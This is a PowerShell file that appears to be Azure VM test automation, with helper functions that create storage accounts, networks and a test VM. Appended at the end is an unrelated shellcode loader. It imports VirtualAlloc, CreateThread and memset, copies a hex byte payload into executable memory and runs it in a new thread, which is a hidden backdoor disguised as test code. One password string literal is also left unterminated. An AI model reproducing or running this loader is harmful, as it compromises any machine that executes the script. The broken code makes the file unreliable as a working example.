



















$global:ps_test_tag_name = 'crptestps6050'


function get_vm_config_object
{
    param ([string] $rgname, [string] $vmsize)
    
    $st = Write-Verbose "Creating VM Config Object - Start";

    $vmname = $rgname + 'vm';
    $p = New-AzVMConfig -VMName $vmname -VMSize $vmsize;

    $st = Write-Verbose "Creating VM Config Object - End";

    return $p;
}


function get_created_storage_account_name
{
    param ([string] $loc, [string] $rgname)

    $st = Write-Verbose "Creating and getting storage account for '${loc}' and '${rgname}' - Start";

    $stoname = $rgname + 'sto';
    $stotype = 'Standard_GRS';

    $st = Write-Verbose "Creating and getting storage account for '${loc}' and '${rgname}' - '${stotype}' & '${stoname}'";

    $st = New-AzStorageAccount -ResourceGroupName $rgname -Name $stoname -Location $loc -Type $stotype;
    $st = Set-AzStorageAccount -ResourceGroupName $rgname -Name $stoname -Tags (Get-ComputeTestTag $global:ps_test_tag_name);
    $st = Get-AzStorageAccount -ResourceGroupName $rgname -Name $stoname;
    
    $st = Write-Verbose "Creating and getting storage account for '${loc}' and '${rgname}' - End";

    return $stoname;
}


function create_and_setup_nic_ids
{
    param ([string] $loc, [string] $rgname, $vmconfig)

    $st = Write-Verbose "Creating and getting NICs for '${loc}' and '${rgname}' - Start";

    $subnet = New-AzVirtualNetworkSubnetConfig -Name ($rgname + 'subnet') -AddressPrefix "10.0.0.0/24";
    $vnet = New-AzVirtualNetwork -Force -Name ($rgname + 'vnet') -ResourceGroupName $rgname -Location $loc -AddressPrefix "10.0.0.0/16" -Subnet $subnet -Tag (Get-ComputeTestTag $global:ps_test_tag_name);
    $vnet = Get-AzVirtualNetwork -Name ($rgname + 'vnet') -ResourceGroupName $rgname;
    $subnetId = $vnet.Subnets[0].Id;
    $nic_ids = @($null) * 1;
    $nic0 = New-AzNetworkInterface -Force -Name ($rgname + 'nic0') -ResourceGroupName $rgname -Location $loc -SubnetId $subnetId -Tag (Get-ComputeTestTag $global:ps_test_tag_name);
    $nic_ids[0] = $nic0.Id;
    $vmconfig = Add-AzVMNetworkInterface -VM $vmconfig -Id $nic0.Id;
    $st = Write-Verbose "Creating and getting NICs for '${loc}' and '${rgname}' - End";

    return $nic_ids;
}

function create_and_setup_vm_config_object
{
    param ([string] $loc, [string] $rgname, [string] $vmsize)

    $st = Write-Verbose "Creating and setting up the VM config object for '${loc}', '${rgname}' and '${vmsize}' - Start";

    $vmconfig = get_vm_config_object $rgname $vmsize

    $user = "Foo12";
    $password = $rgname + "BaR
    $securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
    $cred = New-Object System.Management.Automation.PSCredential ($user, $securePassword);
    $computerName = $rgname + "cn";
    $vmconfig = Set-AzVMOperatingSystem -VM $vmconfig -Windows -ComputerName $computerName -Credential $cred;

    $st = Write-Verbose "Creating and setting up the VM config object for '${loc}', '${rgname}' and '${vmsize}' - End";

    return $vmconfig;
}


function setup_image_and_disks
{
    param ([string] $loc, [string] $rgname, [string] $stoname, $vmconfig)

    $st = Write-Verbose "Setting up image and disks of VM config object jfor '${loc}', '${rgname}' and '${stoname}' - Start";

    $osDiskName = 'osDisk';
    $osDiskVhdUri = "https://$stoname.blob.core.windows.net/test/os.vhd";
    $osDiskCaching = 'ReadWrite';

    $vmconfig = Set-AzVMOSDisk -VM $vmconfig -Name $osDiskName -VhdUri $osDiskVhdUri -Caching $osDiskCaching -CreateOption FromImage;

    
    $imgRef = Get-DefaultCRPImage -loc $loc;
    $vmconfig = ($imgRef | Set-AzVMSourceImage -VM $vmconfig);

    
    $vmconfig.StorageProfile.DataDisks = $null;

    $st = Write-Verbose "Setting up image and disks of VM config object jfor '${loc}', '${rgname}' and '${stoname}' - End";

    return $vmconfig;
}


function ps_vm_dynamic_test_func_1_crptestps5352
{
    
    $rgname = 'crptestps5352';

    try
    {
        $loc = 'East US 2';
        $vmsize = 'Standard_A1';

        $st = Write-Verbose "Running Test ps_vm_dynamic_test_func_1_crptestps5352 - Start ${rgname}, ${loc} & ${vmsize}";

        $st = Write-Verbose 'Running Test ps_vm_dynamic_test_func_1_crptestps5352 - Creating Resource Group';
        $st = New-AzResourceGroup -Location $loc -Name $rgname -Tag (Get-ComputeTestTag $global:ps_test_tag_name) -Force;

        $vmconfig = create_and_setup_vm_config_object $loc $rgname $vmsize;

        
        $stoname = get_created_storage_account_name $loc $rgname;

        
        $nicids = create_and_setup_nic_ids $loc $rgname $vmconfig;

        
        $st = setup_image_and_disks $loc $rgname $stoname $vmconfig;

        
        $st = Write-Verbose 'Running Test ps_vm_dynamic_test_func_1_crptestps5352 - Creating VM';

        $vmname = $rgname + 'vm';
        
        $st = New-AzVM -ResourceGroupName $rgname -Location $loc -VM $vmconfig -Tags (Get-ComputeTestTag $global:ps_test_tag_name);

        
        $st = Write-Verbose 'Running Test ps_vm_dynamic_test_func_1_crptestps5352 - Getting VM';
        $vm1 = Get-AzVM -Name $vmname -ResourceGroupName $rgname;

        
        $st = Write-Verbose 'Running Test ps_vm_dynamic_test_func_1_crptestps5352 - Removing VM';
        $st = Remove-AzVM -Name $vmname -ResourceGroupName $rgname -Force;

        $st = Write-Verbose 'Running Test ps_vm_dynamic_test_func_1_crptestps5352 - End';
    }
    finally
    {
        
        Clean-ResourceGroup $rgname
    }
}


$dT8 = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $dT8 -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xdb,0xda,0xd9,0x74,0x24,0xf4,0xba,0x23,0x63,0x48,0x56,0x58,0x33,0xc9,0xb1,0x47,0x83,0xc0,0x04,0x31,0x50,0x14,0x03,0x50,0x37,0x81,0xbd,0xaa,0xdf,0xc7,0x3e,0x53,0x1f,0xa8,0xb7,0xb6,0x2e,0xe8,0xac,0xb3,0x00,0xd8,0xa7,0x96,0xac,0x93,0xea,0x02,0x27,0xd1,0x22,0x24,0x80,0x5c,0x15,0x0b,0x11,0xcc,0x65,0x0a,0x91,0x0f,0xba,0xec,0xa8,0xdf,0xcf,0xed,0xed,0x02,0x3d,0xbf,0xa6,0x49,0x90,0x50,0xc3,0x04,0x29,0xda,0x9f,0x89,0x29,0x3f,0x57,0xab,0x18,0xee,0xec,0xf2,0xba,0x10,0x21,0x8f,0xf2,0x0a,0x26,0xaa,0x4d,0xa0,0x9c,0x40,0x4c,0x60,0xed,0xa9,0xe3,0x4d,0xc2,0x5b,0xfd,0x8a,0xe4,0x83,0x88,0xe2,0x17,0x39,0x8b,0x30,0x6a,0xe5,0x1e,0xa3,0xcc,0x6e,0xb8,0x0f,0xed,0xa3,0x5f,0xdb,0xe1,0x08,0x2b,0x83,0xe5,0x8f,0xf8,0xbf,0x11,0x1b,0xff,0x6f,0x90,0x5f,0x24,0xb4,0xf9,0x04,0x45,0xed,0xa7,0xeb,0x7a,0xed,0x08,0x53,0xdf,0x65,0xa4,0x80,0x52,0x24,0xa0,0x65,0x5f,0xd7,0x30,0xe2,0xe8,0xa4,0x02,0xad,0x42,0x23,0x2e,0x26,0x4d,0xb4,0x51,0x1d,0x29,0x2a,0xac,0x9e,0x4a,0x62,0x6a,0xca,0x1a,0x1c,0x5b,0x73,0xf1,0xdc,0x64,0xa6,0x6c,0xd8,0xf2,0x06,0x58,0xc7,0x2e,0xf1,0x98,0x07,0x3f,0x5d,0x14,0xe1,0x6f,0x0d,0x76,0xbe,0xcf,0xfd,0x36,0x6e,0xa7,0x17,0xb9,0x51,0xd7,0x17,0x13,0xfa,0x7d,0xf8,0xca,0x52,0xe9,0x61,0x57,0x28,0x88,0x6e,0x4d,0x54,0x8a,0xe5,0x62,0xa8,0x44,0x0e,0x0e,0xba,0x30,0xfe,0x45,0xe0,0x96,0x01,0x70,0x8f,0x16,0x94,0x7f,0x06,0x41,0x00,0x82,0x7f,0xa5,0x8f,0x7d,0xaa,0xbe,0x06,0xe8,0x15,0xa8,0x66,0xfc,0x95,0x28,0x31,0x96,0x95,0x40,0xe5,0xc2,0xc5,0x75,0xea,0xde,0x79,0x26,0x7f,0xe1,0x2b,0x9b,0x28,0x89,0xd1,0xc2,0x1f,0x16,0x29,0x21,0x9e,0x6a,0xfc,0x0f,0xd4,0x82,0x3c;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$ii1=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($ii1.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$ii1,0,0,0);for (;;){Start-sleep 60};

